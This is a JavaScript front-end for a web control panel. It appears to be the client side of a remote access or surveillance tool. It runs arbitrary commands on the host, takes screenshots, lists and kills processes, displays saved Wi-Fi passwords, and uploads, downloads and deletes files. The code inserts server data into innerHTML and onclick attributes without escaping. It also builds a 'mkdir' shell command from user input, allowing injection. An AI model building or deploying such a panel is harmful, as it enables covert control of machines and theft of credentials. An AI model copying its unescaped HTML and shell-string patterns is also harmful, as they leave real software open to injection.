document.addEventListener('DOMContentLoaded', function() {
    document.getElementById('current-path').value = '/';
    document.querySelectorAll('.nav-link').forEach(link => {
        link.addEventListener('click', function(e) {
            e.preventDefault();
            const section = this.getAttribute('data-section');            
            document.querySelectorAll('.content-section').forEach(s => {
                s.style.display = 'none';
            });
            
            document.getElementById(`${section}-section`).style.display = 'block';
            
            if (section === 'processes') {
                getProcesses();
            } else if (section === 'wifi') {
                getWifiPasswords();
            } else if (section === 'files') {
                refreshFiles();
            }
        });
    });
    
    document.getElementById('file-upload').addEventListener('change', function() {
        if (this.files.length > 0) {
            uploadFile(this.files[0]);
        }
    });

    refreshFiles();
});

function executeCommand() {
    const command = document.getElementById('command-input').value;
    if (!command) return;
    
    fetch('/command', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ command: command })
    })
    .then(response => response.json())
    .then(data => {
        const output = document.getElementById('command-output');
        if (data.success) {
            output.textContent = data.output;
        } else {
            output.textContent = `Error: ${data.output}`;
        }
    })
    .catch(error => {
        document.getElementById('command-output').textContent = `Error: ${error.message}`;
    });
}

function takeScreenshot() {
    fetch('/screenshot')
    .then(response => {
        if (response.ok) {
            return response.blob();
        }
        throw new Error('Failed to take screenshot');
    })
    .then(blob => {
        const url = URL.createObjectURL(blob);
        window.open(url, '_blank');
    })
    .catch(error => {
        alert(error.message);
    });
}

function getProcesses() {
    fetch('/processes')
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            const table = document.getElementById('processes-table');
            table.innerHTML = '';
            
            data.processes.forEach(proc => {
                const row = document.createElement('tr');
                row.innerHTML = `
                    <td>${proc.pid}</td>
                    <td>${proc.name}</td>
                    <td>${proc.username || 'N/A'}</td>
                    <td>
                        <button class="btn btn-danger btn-sm" onclick="killProcess(${proc.pid})">Kill</button>
                    </td>
                `;
                table.appendChild(row);
            });
        } else {
            alert(`Error: ${data.error}`);
        }
    });
}

function killProcess(pid) {
    if (!confirm(`Are you sure you want to kill process ${pid}?`)) return;
    
    fetch('/kill-process', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ pid: pid })
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            getProcesses();
        } else {
            alert(`Error: ${data.error}`);
        }
    });
}

function getWifiPasswords() {
    fetch('/wifi')
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            const table = document.getElementById('wifi-table');
            table.innerHTML = '';
            
            data.wifi.forEach(network => {
                const row = document.createElement('tr');
                row.innerHTML = `
                    <td>${network.ssid}</td>
                    <td>${network.password}</td>
                `;
                table.appendChild(row);
            });
        } else {
            alert(`Error: ${data.error}`);
        }
    });
}

function refreshFiles() {
    const path = document.getElementById('current-path').value || '/';
    
    fetch(`/file-manager?path=${encodeURIComponent(path)}`)
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            document.getElementById('current-path').value = data.path;
            const table = document.getElementById('files-table');
            table.innerHTML = '';
            
            // Add parent directory link if not root
            if (data.path !== '/' && data.path !== '\\') {
                const parentRow = document.createElement('tr');
                parentRow.innerHTML = `
                    <td colspan="5">
                        <a href="#" onclick="navigateTo('${data.path.split('/').slice(0, -1).join('/') || '/'}')">.. (Parent Directory)</a>
                    </td>
                `;
                table.appendChild(parentRow);
            }
            
            data.items.forEach(item => {
                const row = document.createElement('tr');
                row.innerHTML = `
                    <td>
                        ${item.is_dir ? 
                            `<a href="#" onclick="navigateTo('${data.path}/${item.name}')">📁 ${item.name}</a>` : 
                            `📄 ${item.name}`}
                    </td>
                    <td>${item.is_dir ? 'Directory' : 'File'}</td>
                    <td>${item.is_dir ? '-' : formatFileSize(item.size)}</td>
                    <td>${item.modified}</td>
                    <td>
                        ${!item.is_dir ? `<button class="btn btn-primary btn-sm" onclick="downloadFile('${data.path}/${item.name}')">Download</button>` : ''}
                        <button class="btn btn-danger btn-sm" onclick="deleteItem('${data.path}/${item.name}', ${item.is_dir})">Delete</button>
                    </td>
                `;
                table.appendChild(row);
            });
        } else {
            alert(`Error: ${data.error}`);
        }
    });
}

function navigateTo(path) {
    document.getElementById('current-path').value = path;
    refreshFiles();
}

function navigateUp() {
    const currentPath = document.getElementById('current-path').value;
    const newPath = currentPath.split('/').slice(0, -1).join('/') || '/';
    navigateTo(newPath);
}

function uploadFile(file) {
    const currentPath = document.getElementById('current-path').value;
    const formData = new FormData();
    formData.append('file', file);
    formData.append('path', currentPath);
    
    fetch('/upload', {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            refreshFiles();
        } else {
            alert(`Error: ${data.error}`);
        }
    });
}

function downloadFile(path) {
    window.open(`/download?path=${encodeURIComponent(path)}`, '_blank');
}

function deleteItem(path, isDir) {
    if (!confirm(`Are you sure you want to delete ${isDir ? 'directory' : 'file'} "${path.split('/').pop()}"?`)) return;
    
    fetch('/delete', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ path: path })
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            refreshFiles();
        } else {
            alert(`Error: ${data.error}`);
        }
    });
}

function createFolder() {
    const modal = new bootstrap.Modal(document.getElementById('folderModal'));
    modal.show();
}

function confirmCreateFolder() {
    const folderName = document.getElementById('folder-name').value;
    if (!folderName) return;
    
    const currentPath = document.getElementById('current-path').value;
    const fullPath = `${currentPath}/${folderName}`;
    
    fetch('/command', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ command: `mkdir "${fullPath}"` })
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            document.getElementById('folder-name').value = '';
            bootstrap.Modal.getInstance(document.getElementById('folderModal')).hide();
            refreshFiles();
        } else {
            alert(`Error: ${data.output}`);
        }
    });
}

function formatFileSize(bytes) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}